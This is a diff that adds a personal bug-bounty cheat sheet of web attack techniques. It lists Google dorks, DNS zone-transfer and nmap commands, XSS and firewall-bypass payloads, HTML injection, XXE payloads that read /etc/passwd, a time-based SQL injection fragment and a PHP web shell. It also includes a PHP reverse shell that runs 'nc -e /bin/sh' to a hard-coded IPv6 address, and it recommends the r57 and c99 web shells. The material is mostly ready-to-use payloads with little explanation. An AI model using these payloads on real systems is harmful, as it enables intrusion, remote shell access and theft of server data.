@@ -1,0 +1,127 @@
+#finding subdomains manually
+site:anything.eu
+site:projects.knmi.nl
+##########################
+Finding all websites on a single server
+dig axfr @ipofserver website_hosted_on_that_server +nostat +nocomments +nocmd
+
+######################################
+useful google droks for bug bounty:-
+
+site:your-target.com inurl:id=
+site:your-target.com filetype:php
+site:your-target.com intitle:upload
+inurl:”.php?id=” intext:”View cart”
+inurl:”.php?cid=” intext:”shopping”
+inurl:/news.php?include=
+inurl:”.php?query=”
+#####################################
+
+
+##Initial scanning using nmap for services
+nmap -PS -sV ip
+
+#checking for xss
+Advance alibaba xss firewall bypass payload:-
+<video</onload='1>(_=alert,_(`venom`))"><source>
+x";prompt(0);x="x"
+"><img src=x onerror=alert('xss'):><"
+a"><svg/onload=prompt(1)>
+"><svg onload=alert(document.domain)>
+javascript:alert(document.domain)
+<img src="x" onerror="alert('venom')">
+</script><svg onload=alert(venom)>
+<svg/onload=alert(1);
+"><img src=x onerror=alert(document.domain)>
+whenever your input reflect as plain text you should use svg vector
+<svg><script>alert&#40;1)</script>
+whenever they take url as input field you can try to inject payload through a file create a file file.js and write your script in it and then try to load that file using url.iF done then there is rfx (remote file xss)
+if your payload is displaying as a text then you need to convert the type 
+hello"type=image src onerror="alert(1)
+
+
+
+ and a paramater as Referer: venom
+ check wheather reflecting or not
+
+
+X-Forwarded-Host: http://bing.com
+
+
+;;;;;;;;;;;;;;;;;;;;;;
+
+html injection:-
+<A HREF="http://bing.com/">tony</A>
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+php payload:-
+<?php echo system($_REQUEST['venom']); ?>
+<?php system('ls');?>
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+XXE
+add this to post request in burp for checking xxe :-
+Content-type: application/xml
+
+and then at the end add xxe payloads
+
+simple xml payload:-
+<foo><text>venom</text></foo>
+OR
+     
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE dtgmlf6 [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE employee [
+ <!ELEMENT employee(#PCDATA)>
+ <!ENTITY name SYSTEM "file:///etc/passwd">
+]>
+<employee>&name;</employee>
+
+############################
+php reverse shell code:-
+<?passthru("nc -e /bin/sh 2405:204:9212:2636:d54a:4d49:d0f3:3a3c 1234");?>
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+RCE
+Purpose of command  	Linux 	        Windows
+Name of current user 	whoami      	whoami
+Operating system 	    uname -a     	ver
+Network configuration 	ifconfig 	    ipconfig /all
+Network connections 	netstat -an     netstat -an
+Running processes 	    ps -ef 	        tasklist 
+
+
+
+#####################################
+to scan for mahines in your ntework
+nmap -sn 192.168.233.0/24
+
+
+##################################
+sqli:-
+,sleep(5*5),0))OR'
+
+###################################
+you can get well web shells at r57.gen.tr website
+r57 and c99 are realy good web shells
+
+X-Forwarded-For: 127.0.0.1, 127.0.01, 127.0.0.1
+X-HackerOne: Shopify
+Content-Length: 69
+
+{"query": "query allLocations{allLocations{address, code, contact}}"}
+
+
+systemctl snapshot:-takes snapshot of system can be used if system got crashed do study
+
+
+
+
+
+
+
